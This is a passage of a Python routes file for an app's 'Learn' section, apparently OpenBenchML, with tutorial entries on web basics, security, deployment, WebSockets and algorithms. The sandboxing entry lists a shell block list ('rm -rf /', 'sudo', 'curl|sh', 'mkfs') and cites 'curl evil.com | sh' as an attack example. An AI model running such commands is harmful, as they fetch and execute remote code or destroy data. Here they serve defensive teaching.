        "color": "#ff7b72",
        "blurb": "HTML, CSS, and vanilla JS — the building blocks of every page.",
        "concepts": [
            {
                "slug": "html-structure",
                "title": "HTML structure & semantic tags",
                "summary": "<nav>, <main>, <section>, <article> — describe what content IS, not just how it looks.",
                "code": "<nav class='navbar'>…</nav>\n<main class='container'>\n  <section class='card'>\n    <article class='model-card'>…</article>\n  </section>\n</main>\n<footer>…</footer>",
                "explanation": "Semantic HTML tags describe the role of the content: <nav> for navigation, <main> for the primary content, <article> for a self-contained piece, <section> for a thematic group, <footer> for page-level metadata. Using them helps screen readers, search engines, and developer tools understand the page. OpenBenchML's base.html uses <nav> for the top bar, <main> for the page content, and <footer> for the bottom links.",
                "used_in": "templates/base.html — the page skeleton uses semantic tags throughout.",
            },
            {
                "slug": "css-box-model",
                "title": "CSS box model",
                "summary": "Every element is a box: content + padding + border + margin. Know the order.",
                "code": ".card {\n  padding: 16px;      /* inside border */\n  border: 1px solid;  /* edge of box */\n  margin: 8px;        /* outside border */\n  width: 300px;       /* content width */\n}\n/* total width = 300 + 16+16 + 1+1 + 8+8 = 350px */",
                "explanation": "Every HTML element is rendered as a rectangular box. The box has four layers, inside-out: content (the text/image), padding (space inside the border), border (the visible edge), margin (space outside the border). When you set width:300px, that's the content width — the actual rendered width is content + padding + border. Use box-sizing: border-box to make width include padding+border (more intuitive). OpenBenchML's CSS sets box-sizing: border-box globally in style.css.",
                "used_in": "static/css/style.css — global box-sizing: border-box rule.",
            },
            {
                "slug": "css-flexbox",
                "title": "Flexbox layout",
                "summary": "display:flex turns a container's children into a row or column. Justify/align controls spacing.",
                "code": ".toolbar {\n  display: flex;\n  gap: 0.5rem;\n  align-items: center;      /* vertical center */\n  justify-content: flex-start;  /* horizontal */\n}\n.toolbar .spacer { margin-left: auto; }  /* push right */",
                "explanation": "Flexbox is the modern way to lay out rows and columns. Set display:flex on the parent; children become flex items that you can align, distribute, and reorder. align-items controls the cross-axis (vertical for a row); justify-content controls the main axis (horizontal for a row). margin-left:auto on a flex item pushes it and everything after it to the right — the classic 'push to the end' trick. The notebook toolbar uses flex with margin-left:auto on the kernel pill.",
                "used_in": "Notebook toolbar, navbar, sidebar cards — flex is everywhere in the app's CSS.",
            },
            {
                "slug": "css-grid",
                "title": "CSS Grid",
                "summary": "Two-dimensional layout. Perfect for sidebars + main content + footer rows.",
                "code": ".competition-detail-grid {\n  display: grid;\n  grid-template-columns: 1fr 320px;\n  gap: 1.5rem;\n}\n@media (max-width: 800px) {\n  .competition-detail-grid { grid-template-columns: 1fr; }\n}",
                "explanation": "CSS Grid lets you lay out content in two dimensions (rows AND columns) — flexbox only does one dimension at a time. Define columns with grid-template-columns (1fr = one fraction of the available space). Add a media query to collapse to one column on mobile. Grid is the right tool for page-level layout (sidebar + main); flex is the right tool for component-level layout (toolbar, button row). OpenBenchML uses grid for the competition detail page and the notebook layout.",
                "used_in": "competition_detail.html, notebook.html — two-column layouts with grid + media queries.",
            },
            {
                "slug": "css-variables",
                "title": "CSS custom properties (variables)",
                "summary": "--accent: #a0c000; color: var(--accent); Change once, update everywhere.",
                "code": ":root {\n  --accent: #a0c000;\n  --text-primary: #e6edf3;\n}\n.btn-primary {\n  background: var(--accent);\n  color: #1a1a1a;\n}",
                "explanation": "CSS custom properties (variables) let you define a value once and reuse it across the stylesheet. The big win: theming. OpenBenchML defines --accent, --bg-primary, --text-primary, --border, --shadow-glow on :root, then every component uses var(--accent) etc. To re-skin the entire app from olive to violet, you change one line. CSS variables also work in calc() — `padding: calc(var(--gap) * 2)` — and can be overridden per-component with inline styles.",
                "used_in": "static/css/style.css — :root defines 20+ custom properties that drive the entire theme.",
            },
            {
                "slug": "js-dom",
                "title": "DOM manipulation",
                "summary": "document.querySelector, createElement, addEventListener — the vanilla JS toolkit.",
                "code": "const btn = document.querySelector('#run-btn');\nbtn.addEventListener('click', () => {\n  const cell = document.createElement('div');\n  cell.className = 'cell';\n  cell.textContent = 'new cell';\n  document.querySelector('#canvas').appendChild(cell);\n});",
                "explanation": "The DOM (Document Object Model) is the browser's in-memory representation of the HTML page. JS can query it (querySelector), create new nodes (createElement), mutate them (textContent, className, setAttribute), and insert them (appendChild, innerHTML). Event listeners fire when the user interacts (click, keydown, input). The notebook's addCodeCell, renderCell, renderOutput functions are pure DOM manipulation — no framework needed.",
                "used_in": "templates/notebook.html — every cell is built with createElement + innerHTML.",
            },
            {
                "slug": "js-fetch",
                "title": "fetch() & async/await",
                "summary": "Call an API, await the JSON, update the DOM. No jQuery, no axios — just fetch.",
                "code": "async function runCell(cellId) {\n  const res = await fetch('/api/notebook/cell', {\n    method: 'POST',\n    headers: {'Content-Type': 'application/json'},\n    body: JSON.stringify({code: cell.source})\n  });\n  const data = await res.json();\n  renderOutput(cell, data);\n}",
                "explanation": "fetch() is the browser's built-in HTTP client. It returns a Promise that resolves to the Response. await unwraps the Promise so you can write async code that reads top-to-bottom. The notebook's runCell function is a textbook example: POST to the API, await the JSON, render the result. Always handle errors with try/catch (or .catch()) — a network blip will reject the promise and crash your render function otherwise.",
                "used_in": "templates/notebook.html — runCellServer, installPackage, resetKernel, refreshKernelInfo all use fetch.",
            },
            {
                "slug": "js-template-literals",
                "title": "Template literals & HTML strings",
                "summary": "Backticks let you embed ${vars} in strings. Powerful, but mind the backtick-in-backtick footgun.",
                "code": "const html = `\n  <div class='cell'>\n    <span>In [${i}]</span>\n    <button onclick='runCell(\"${cell.id}\")'>Run</button>\n  </div>\n`;\ncontainer.innerHTML = html;",
                "explanation": "Template literals (backticks) are JS's answer to f-strings. They support multi-line strings and ${expression} interpolation. They're the standard way to build HTML strings in vanilla JS. The footgun: if the literal contains a backtick (e.g. inside a placeholder attribute), the parser terminates the string early and the whole script crashes. Always escape user-provided content with escapeHtml() before interpolating it into a template literal — otherwise you have both an XSS hole AND a crash bug.",
                "used_in": "Every JS-heavy template (notebook, competition_detail, realtime) uses template literals for HTML generation.",
            },
        ],
    },

    # ─── Security ────────────────────────────────────────────────────────
    {
        "category": "Security",
        "slug": "security",
        "icon": "lock",
        "color": "#f85149",
        "blurb": "Authentication, authorisation, sandboxing, and the constant vigilance mindset.",
        "concepts": [
            {
                "slug": "sec-jwt",
                "title": "JSON Web Tokens (JWT)",
                "summary": "A signed JSON payload. The server signs it; the client stores it in a cookie; the server verifies the signature on every request.",
                "code": "# login\npayload = {'sub': user.id, 'exp': now + 3600}\ntoken = jwt.encode(payload, SECRET_KEY, 'HS256')\nresponse.set_cookie('access_token', token, httponly=True)\n\n# every request\npayload = jwt.decode(token, SECRET_KEY, ['HS256'])\nuser_id = payload['sub']",
                "explanation": "A JWT is a JSON payload (user id, expiry, etc.) signed with a secret key. The signature proves the token wasn't tampered with. The flow: on login, the server creates a JWT and sets it as an httpOnly cookie (so JS can't read it). On every subsequent request, the server reads the cookie, verifies the signature, and extracts the user id. If the signature is invalid or the token has expired, the user is treated as logged out. OpenBenchML uses python-jose for encode/decode.",
                "used_in": "app/routes/auth.py — login creates the JWT, get_current_user_from_cookie verifies it.",
            },
            {
                "slug": "sec-cookies",
                "title": "Cookie security flags",
                "summary": "httpOnly (no JS access), Secure (HTTPS only), SameSite (CSRF defence).",
                "code": "response.set_cookie(\n    'access_token', token,\n    httponly=True,        # JS can't read it\n    secure=True,          # HTTPS only (prod)\n    samesite='lax',       # CSRF defence\n    max_age=3600,\n)",
                "explanation": "Cookies have three critical security flags. httpOnly prevents JavaScript from reading the cookie — defeats XSS token theft. Secure ensures the cookie is only sent over HTTPS — defeats network sniffing. SameSite=Lax prevents the cookie from being sent on cross-site POST requests — defeats most CSRF attacks. OpenBenchML sets httpOnly and SameSite in dev; Secure is added in production (where HTTPS is terminated by the proxy).",
                "used_in": "app/routes/auth.py — set_cookie calls use httponly + samesite.",
            },
            {
                "slug": "sec-sandbox",
                "title": "Sandboxing user code",
                "summary": "Allowlist commands, block dangerous patterns, cap memory & time, isolate processes.",
                "code": "ALLOWED = {'pip', 'python', 'ls', 'cat', 'grep'}\nBLOCKED = ['rm -rf /', 'sudo', 'curl|sh', 'mkfs']\n\ndef run_shell(cmd):\n    if any(b in cmd for b in BLOCKED): raise SecurityError\n    if cmd.split()[0] not in ALLOWED: raise SecurityError\n    subprocess.run(cmd, cwd='/tmp', timeout=60)",
                "explanation": "Running user-supplied code is inherently dangerous — they could try `rm -rf /` or `curl evil.com | sh`. OpenBenchML's notebook uses a layered defence: (1) an allowlist of safe commands (pip, python, ls, cat, ...), (2) a blocklist of dangerous patterns (rm -rf /, sudo, mkfs, curl|sh), (3) a per-user /tmp working directory so files don't leak between users, (4) a 30-min idle timeout, (5) per-cell execution timeout. No single defence is enough — the layers back each other up.",
                "used_in": "app/routes/notebook.py — _ALLOWED_SHELL_COMMANDS + _BLOCKED_SHELL_PATTERNS.",
            },
            {
                "slug": "sec-input-validation",
                "title": "Input validation",
                "summary": "Never trust user input. Pydantic models enforce length, type, and regex at the boundary.",
                "code": "class NotebookInstallRequest(BaseModel):\n    package: str = Field(\n        ..., min_length=1, max_length=100,\n        pattern=r'^[a-zA-Z0-9_\\-\\.\\[\\]>=<~ ;,]+$'\n    )\n    timeout_seconds: int = Field(default=180, ge=10, le=600)",
                "explanation": "Every byte of user input is potentially hostile. Pydantic models act as a bouncer at the API door: they reject anything that doesn't match the schema before the route handler ever sees it. The notebook install endpoint uses a regex pattern to allow only valid pip package specifiers — no shell metacharacters, no path traversal, no command injection. Length limits (max_length=100) prevent memory-exhaustion attacks. Numeric bounds (ge=10, le=600) prevent timeout=0 or timeout=999999.",
                "used_in": "Every POST endpoint uses Pydantic models with explicit bounds. app/routes/notebook.py has the strictest schemas.",
            },
            {
                "slug": "sec-xss",
                "title": "Cross-site scripting (XSS) defence",
                "summary": "Always escape user content before inserting into HTML. escapeHtml() is your best friend.",
                "code": "function escapeHtml(s) {\n  return String(s)\n    .replace(/&/g,'&amp;')\n    .replace(/</g,'&lt;')\n    .replace(/>/g,'&gt;')\n    .replace(/\"/g,'&quot;')\n    .replace(/'/g,'&#39;')\n    .replace(/`/g,'&#96;');  // crucial for template literals\n}",
                "explanation": "XSS is when attacker-controlled HTML/JS runs in another user's browser. The defence: convert <, >, &, ', \", and ` to HTML entities before inserting user content into innerHTML. The ` character is often forgotten — but it's critical because it terminates JS template literals, which can crash the whole script block (the bug we just fixed in notebook.html). The notebook, competition detail, and realtime templates all use escapeHtml() now. Jinja2's {{ var }} auto-escapes by default; only innerHTML assignments in JS need manual escaping.",
                "used_in": "templates/notebook.html, competition_detail.html, realtime.html — escapeHtml() on every user-controlled interpolation.",
            },
        ],
    },

    # ─── DevOps & Deployment ─────────────────────────────────────────────
    {
        "category": "DevOps & Deployment",
        "slug": "devops",
        "icon": "rocket",
        "color": "#39c5cf",
        "blurb": "From git push to live URL — Docker, Render, env vars, health checks.",
        "concepts": [
            {
                "slug": "dev-docker",
                "title": "Docker & Dockerfile",
                "summary": "A Dockerfile describes how to build a reproducible image. Same image runs locally and in prod.",
                "code": "FROM python:3.11-slim\nWORKDIR /app\nCOPY requirements.txt .\nRUN pip install --no-cache-dir -r requirements.txt\nCOPY . .\nEXPOSE 8000\nCMD [\"uvicorn\", \"app.main:app\", \"--host\", \"0.0.0.0\", \"--port\", \"8000\"]",
                "explanation": "Docker packages your app + its dependencies + the OS into a single image that runs identically everywhere. The Dockerfile is the recipe: start from a base image (python:3.11-slim), copy your code in, install deps, expose a port, run a command. The big wins: no more 'works on my machine' — if it runs in Docker on your laptop, it runs in Docker on Render/AWS/GCP. OpenBenchML ships a Dockerfile and a docker-compose.yml for local Postgres + app.",
                "used_in": "Dockerfile, docker-compose.yml at the project root.",
            },
            {
                "slug": "dev-render",
                "title": "Render deployment",
                "summary": "Connect a GitHub repo, Render builds the Docker image and runs it on a managed VM.",
                "code": "# render.yaml (excerpt)\nservices:\n  - type: web\n    name: openbenchml\n    env: docker\n    healthCheckPath: /health\n    envVars:\n      - key: SECRET_KEY\n        sync: false\n      - key: DATABASE_URL\n        fromDatabase: { name: db, property: connectionString }",
                "explanation": "Render is a PaaS like Heroku. You push to GitHub; Render detects the Dockerfile, builds the image, runs it on a managed VM, gives it a URL, terminates HTTPS, and restarts on crash. The render.yaml file is infrastructure-as-code: it declares the service, the health check endpoint, the env vars, and the database. Health checks (GET /health) let Render know if the app is alive — if it fails, Render restarts the container. OpenBenchML deploys to Render with a free Postgres add-on.",
                "used_in": "render.yaml at the project root configures the Render deployment.",
            },
            {
                "slug": "dev-envvars",
                "title": "Environment variables",
                "summary": "Config that changes between environments. Never hardcode secrets in source.",
                "code": "import os\nSECRET_KEY = os.getenv('SECRET_KEY', 'dev-default')\nDATABASE_URL = os.getenv('DATABASE_URL', 'sqlite:///local.db')\nDEBUG = os.getenv('DEBUG', 'True').lower() == 'true'",
                "explanation": "Every environment (laptop, staging, prod) needs different config: different DB URLs, different secret keys, different log levels. Hardcoding them in source means you'd have to edit code between deploys. Env vars solve this: the same code reads os.getenv() and gets different values depending on where it runs. Secrets (SECRET_KEY, DATABASE_URL) are set in the Render dashboard, never committed to git. The .env file is for local dev only and is gitignored.",
                "used_in": "app/config.py — every setting reads from os.getenv() with a safe default.",
            },
            {
                "slug": "dev-health",
                "title": "Health checks & observability",
                "summary": "/health endpoint tells the load balancer 'am I alive?'. Log every request with timing.",
                "code": "@app.get('/health')\nasync def health():\n    return {\n        'status': 'healthy',\n        'version': APP_VERSION,\n        'database': check_db(),\n        'system': {'cpu': psutil.cpu_percent(), 'mem': psutil.virtual_memory().percent}\n    }",
                "explanation": "A health endpoint is a lightweight GET that returns 200 if the app is alive. Render hits /health every few seconds; if it returns non-200 or times out, Render restarts the container. The endpoint should check critical dependencies (DB, Redis) so a broken DB doesn't look 'healthy'. OpenBenchML's /health returns version, DB status, system metrics, and WebSocket connection count — useful both for Render and for ad-hoc debugging.",
                "used_in": "app/main.py — /health endpoint with DB + Redis + system checks.",
            },
            {
                "slug": "dev-git",
                "title": "Git workflow",
                "summary": "Branch, commit, push, PR. Conventional commit messages keep history readable.",
                "code": "git checkout -b fix/notebook-backtick\ngit commit -m 'fix(notebook): escape backtick in markdown placeholder'\ngit push origin fix/notebook-backtick\n# open PR on GitHub → Render auto-deploys on merge",
                "explanation": "Git is the version-control system that tracks every change to the codebase. The conventional-commit format (type(scope): subject) makes the history machine-parseable and human-readable: 'fix(notebook): ...' is a bugfix in the notebook module, 'feat(learn): ...' is a new feature in the learn module. OpenBenchML uses a single main branch with feature branches + PRs. Render auto-deploys when main is updated, so 'git push' is literally the deploy command.",
                "used_in": "Every change to the codebase goes through git. The worklog.md tracks agent-side changes.",
            },
        ],
    },

    # ─── Real-time ───────────────────────────────────────────────────────
    {
        "category": "Real-time & WebSockets",
        "slug": "realtime",
        "icon": "bolt",
        "color": "#eab308",
        "blurb": "Pushing updates to browsers without polling — the magic behind live leaderboards.",
        "concepts": [
            {
                "slug": "rt-polling-vs-ws",
                "title": "Polling vs WebSockets",
                "summary": "Polling: client asks 'any update?' every 5s. WebSocket: server pushes the instant it happens.",
                "code": "# polling (bad — 5s lag, wasted requests)\nsetInterval(() => fetch('/api/leaderboard'), 5000)\n\n# websocket (good — instant, no wasted requests)\nconst ws = new WebSocket('wss://app/ws/leaderboard')\nws.onmessage = (e) => updateLeaderboard(JSON.parse(e.data))",
                "explanation": "Real-time updates have two architectures. Polling: the client asks the server 'anything new?' every N seconds. Simple but laggy (5s average delay) and wasteful (99% of polls return nothing). WebSocket: a persistent bidirectional connection. The server pushes the instant an event happens — sub-100ms latency, zero wasted requests. OpenBenchML uses WebSocket for leaderboard updates, benchmark progress, and notifications. The notebook terminal uses WebSocket to pipe PTY bytes back and forth.",
                "used_in": "app/main.py — three WS endpoints. app/routes/notebook.py — one WS for the terminal.",
            },
            {
                "slug": "rt-connection-manager",
                "title": "Connection manager pattern",
                "summary": "Track active connections in a dict. broadcast() sends to all; send_json() sends to one.",
                "code": "class ConnectionManager:\n    def __init__(self):\n        self.active = {}\n\n    async def connect(self, ws, cid):\n        await ws.accept()\n        self.active[cid] = ws\n\n    async def broadcast(self, msg):\n        for ws in list(self.active.values()):\n            await ws.send_json(msg)",
                "explanation": "Every WebSocket server needs a registry of active connections. The ConnectionManager class in main.py is a thin wrapper around a dict: connect() accepts the WS and stores it; disconnect() removes it; broadcast() iterates and sends to all; send_json() sends to one. The notebook terminal has its own per-user manager because each terminal is a dedicated PTY, not a broadcast channel. Always handle send failures — a closed connection will raise, and you need to clean it up.",
                "used_in": "app/main.py — ws_manager is the global ConnectionManager. app/routes/notebook.py — _terminal_manager for per-user PTYs.",
            },
            {
                "slug": "rt-heartbeat",
                "title": "Heartbeat & reconnect",
                "summary": "Send a ping every 30s to keep the connection alive. Auto-reconnect on close.",
                "code": "// client\nsetInterval(() => {\n  if (ws.readyState === WebSocket.OPEN)\n    ws.send(JSON.stringify({type: 'ping'}));\n}, 30000);\n\nws.onclose = () => {\n  setTimeout(connect, 3000);  // retry in 3s\n};",
                "explanation": "WebSocket connections can be killed by idle timeouts (proxies often cut idle connections at 60s), network blips, or server restarts. Two defences: (1) heartbeat — send a ping every 30s to keep the connection 'active'; the server responds with pong. (2) auto-reconnect — on close, wait a few seconds and try again. The realtime.html page does both: every 30s it pings, and on close it retries in 3s. This makes the connection resilient to transient failures.",
                "used_in": "templates/realtime.html — ping every 30s + reconnect on close. templates/notebook.html — terminal heartbeat.",
            },
            {
                "slug": "rt-xterm",
                "title": "xterm.js + PTY over WebSocket",
                "summary": "Browser renders a terminal; PTY subprocess does the actual shell work; WebSocket pipes bytes between them.",
                "code": "# server\nimport pty, os\nmaster, slave = pty.openpty()\nproc = subprocess.Popen(['bash'], stdin=slave, stdout=slave, stderr=slave, start_new_session=True)\n\nasync def pipe_to_ws(master_fd, ws):\n    while True:\n        data = os.read(master_fd, 1024)\n        await ws.send_bytes(data)",
                "explanation": "A real browser terminal needs three pieces. (1) xterm.js — a JS library that renders a terminal UI in a div, handles keystrokes, and writes bytes for the cursor / colors / scrollback. (2) A PTY (pseudo-terminal) — a Unix kernel feature that lets you spawn bash as if it were connected to a real terminal. bash thinks it's talking to a real screen; the master side gives you a file descriptor you can read/write. (3) A WebSocket — pipes keystrokes from xterm to the PTY stdin, and PTY stdout bytes back to xterm. The notebook terminal uses this exact stack.",
                "used_in": "app/routes/notebook.py — /api/notebook/terminal WS endpoint spawns a PTY bash subprocess.",
            },
        ],
    },

    # ─── Algorithms ──────────────────────────────────────────────────────
    {
        "category": "Algorithms & Data Structures",
        "slug": "algorithms",
        "icon": "tree",
        "color": "#3fb950",
        "blurb": "The patterns that make code fast: hashing, sorting, recursion, complexity.",
        "concepts": [
            {
                "slug": "algo-big-o",
                "title": "Big-O complexity",
                "summary": "How runtime grows with input size. O(1) constant, O(n) linear, O(n²) quadratic, O(log n) logarithmic.",
                "code": "# O(1) — constant\nnums[0]\n\n# O(n) — linear\nfor x in nums: process(x)\n\n# O(n²) — quadratic (nested loop over same n)\nfor x in nums:\n  for y in nums: compare(x, y)",
                "explanation": "Big-O describes how an algorithm's runtime grows as the input grows. O(1) doesn't grow at all (hash lookup). O(log n) grows slowly (binary search — doubling the input adds one step). O(n) grows linearly (single loop). O(n²) grows quadratically (nested loop). For n=1000: O(n) is 1000 ops, O(n²) is 1,000,000 ops. The notebook's package hint map is a dict — O(1) lookup vs O(n) list scan matters when you're checking 60+ packages per cell execution.",
                "used_in": "The notebook's _PACKAGE_HINTS dict gives O(1) import→pip-name lookup.",
            },
            {
                "slug": "algo-hashing",
                "title": "Hash tables (dicts)",
                "summary": "O(1) average insert/lookup/delete. The workhorse of fast Python code.",
                "code": "session = {}  # dict = hash table\nsession['user_id'] = 1           # O(1) insert\nuid = session['user_id']          # O(1) lookup\n'session_id' in session           # O(1) membership\n\ndel session['user_id']            # O(1) delete",
                "explanation": "A hash table (Python dict) maps keys to values in O(1) average time. The trick: a hash function converts the key to an integer, which is used as an array index. Collisions (two keys hashing to the same index) are handled by chaining. Python's dict is one of the most optimised hash tables in any language. The notebook uses a dict for the per-user namespace — variable lookup is O(1) no matter how many variables you've defined.",
                "used_in": "Notebook session.namespace is a dict. _PACKAGE_HINTS is a dict. _ALLOWED_SHELL_COMMANDS is a set (hash table).",
            },
            {
                "slug": "algo-sorting",
                "title": "Sorting",
                "summary": "Python's sorted() uses Timsort (O(n log n)). Stable, fast, built-in.",
                "code": "# sort by score descending\nleaderboard = sorted(rows, key=lambda r: r.score, reverse=True)\n\n# multi-key sort: score desc, then time asc\nleaderboard = sorted(rows, key=lambda r: (-r.score, r.elapsed_ms))\n\n# in-place\nrows.sort(key=lambda r: r.score, reverse=True)",
                "explanation": "Sorting arranges items in order. Python's sorted() returns a new list; list.sort() sorts in place. Both use Timsort (a hybrid merge/insertion sort) at O(n log n). The key= argument lets you sort by a computed field — sorted() calls key on each item and sorts by the result. The leaderboard code uses sorted(rows, key=lambda r: -r.score) to rank by score descending. The negative-sign trick turns a descending sort into an ascending sort on the negated key.",
                "used_in": "app/routes/leaderboard.py — sorted() with key= to rank by score / speed / size.",
            },
            {
                "slug": "algo-recursion",
                "title": "Recursion",
                "summary": "A function that calls itself. Needs a base case to terminate.",
                "code": "def factorial(n):\n    if n <= 1:           # base case\n        return 1\n    return n * factorial(n - 1)  # recursive case\n\nfactorial(5)  # 120",
                "explanation": "Recursion is when a function calls itself. Every recursive function needs (1) a base case that returns without recursing, (2) a recursive case that calls itself with a smaller input. Without a base case, you get infinite recursion → stack overflow. Recursion is natural for tree-structured data (file systems, JSON, ASTs) and divide-and-conquer algorithms (merge sort, binary search). Python's default recursion limit is 1000 — deep recursion needs to be rewritten iteratively or you'll hit RecursionError.",
                "used_in": "Used implicitly in JSON serialisation, ORM relationship walking, and template rendering.",
            },
            {
                "slug": "algo-caching",
                "title": "Caching & memoization",
                "summary": "Store expensive results so you don't recompute. functools.lru_cache is the easy button.",
                "code": "from functools import lru_cache\n\n@lru_cache(maxsize=128)\ndef fib(n):\n    if n < 2: return n\n    return fib(n-1) + fib(n-2)\n\n# first call: slow (computes everything)\nfib(50)\n# second call: instant (cached)\nfib(50)",
                "explanation": "Caching stores the result of an expensive function so future calls with the same arguments return instantly. functools.lru_cache is a decorator that does this automatically — least-recently-used eviction when the cache fills. The notebook could cache package recommendation results per session so re-running a cell with the same imports doesn't re-parse. The trade-off: caching uses memory, and it's only a win if the same inputs recur. Cache invalidation (knowing when the cached result is stale) is famously hard.",
                "used_in": "Not heavily used in OpenBenchML yet — most routes hit the DB on every request. Could be added for hot paths like the leaderboard.",
            },
        ],
    },
]


# Flatten the tree for lookup
_LEARN_FLAT = {}
for cat in LEARN_TREE:
    for concept in cat["concepts"]:
        _LEARN_FLAT[concept["slug"]] = {"concept": concept, "category": cat}


@router.get("/learn", response_class=HTMLResponse)
async def learn_landing(request: Request):
    """Render the Learn landing page — all categories + concepts."""
    db = SessionLocal()
    try:
        user = await get_current_user_from_cookie(request, db)
    finally:
        db.close()

    total_concepts = sum(len(c["concepts"]) for c in LEARN_TREE)

    return templates.TemplateResponse("learn.html", {
        "request": request,
        "user": user,
        "app_name": APP_NAME,
        "app_version": APP_VERSION,
        "tree": LEARN_TREE,
        "total_concepts": total_concepts,
        "view": "landing",
    })


@router.get("/learn/cat/{cat_slug}", response_class=HTMLResponse)
async def learn_category(request: Request, cat_slug: str):
    """Render a single category page — all concepts in that category."""
    db = SessionLocal()
    try:
        user = await get_current_user_from_cookie(request, db)
    finally:
        db.close()

    cat = next((c for c in LEARN_TREE if c["slug"] == cat_slug), None)
    if cat is None:
        raise HTTPException(status_code=404, detail="Category not found")

    return templates.TemplateResponse("learn.html", {
        "request": request,
        "user": user,
        "app_name": APP_NAME,
        "app_version": APP_VERSION,
        "tree": LEARN_TREE,
        "total_concepts": sum(len(c["concepts"]) for c in LEARN_TREE),
        "view": "category",
        "current_cat": cat,
    })


@router.get("/learn/{slug}", response_class=HTMLResponse)
async def learn_concept(request: Request, slug: str):
    """Render a single concept page — full explanation + code + where it's used."""
    db = SessionLocal()
    try:
        user = await get_current_user_from_cookie(request, db)
    finally:
        db.close()

    entry = _LEARN_FLAT.get(slug)
    if entry is None:
        raise HTTPException(status_code=404, detail="Concept not found")

    concept = entry["concept"]
    cat = entry["category"]

    # Find prev/next within the same category for nav
    concepts_in_cat = cat["concepts"]
    idx = next((i for i, c in enumerate(concepts_in_cat) if c["slug"] == slug), -1)
    prev_concept = concepts_in_cat[idx - 1] if idx > 0 else None
    next_concept = concepts_in_cat[idx + 1] if idx < len(concepts_in_cat) - 1 else None

    return templates.TemplateResponse("learn.html", {
        "request": request,
        "user": user,
        "app_name": APP_NAME,
        "app_version": APP_VERSION,
        "tree": LEARN_TREE,
        "total_concepts": sum(len(c["concepts"]) for c in LEARN_TREE),
        "view": "concept",
        "concept": concept,
        "current_cat": cat,
        "prev_concept": prev_concept,
        "next_concept": next_concept,
    })
